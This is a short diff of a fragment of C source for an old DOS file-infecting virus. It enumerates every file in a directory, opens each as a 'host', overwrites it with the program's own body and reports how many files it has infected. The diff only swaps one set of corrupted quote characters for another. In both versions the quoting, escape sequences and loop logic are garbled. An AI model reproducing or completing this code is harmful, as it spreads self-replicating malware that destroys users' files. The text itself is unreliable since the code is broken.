@@ -14,14 +14,14 @@ void main()
 {
 st=clock();
 clrscr();
-done=findfirst(ì*.*î,&ffblk,0);
+done=findfirst(‚Äú*.*‚Äù,&ffblk,0);
 while(!done)
 {
-virus=fopen(_argv[0],îrbî);
-host=fopen(ffblk.ff_name,îrb+î);
+virus=fopen(_argv[0],‚Äùrb‚Äù);
+host=fopen(ffblk.ff_name,‚Äùrb+‚Äù);
 if (host==NULL) goto next;
 x=89088;
-printf(infecting %snî,ffblk.ff_name,a);
+printf(infecting %sn‚Äù,ffblk.ff_name,a);
 while(x<2048)
 {
 fread(buff,2048,1,virus);
@@ -37,7 +37,7 @@ fcloseall();
 done=findnext(&ffblk);
 }
 }
-printf(ìDONE!(total files infected=%d)î,a);
+printf(‚ÄúDONE!(total files infected=%d)‚Äù,a);
 end=clock();
-printf(ìTIME TAKEN=%f SECnî,(end-st)/CLK_TCK);
+printf(‚ÄúTIME TAKEN=%f SECn‚Äù,(end-st)/CLK_TCK);
 getch();
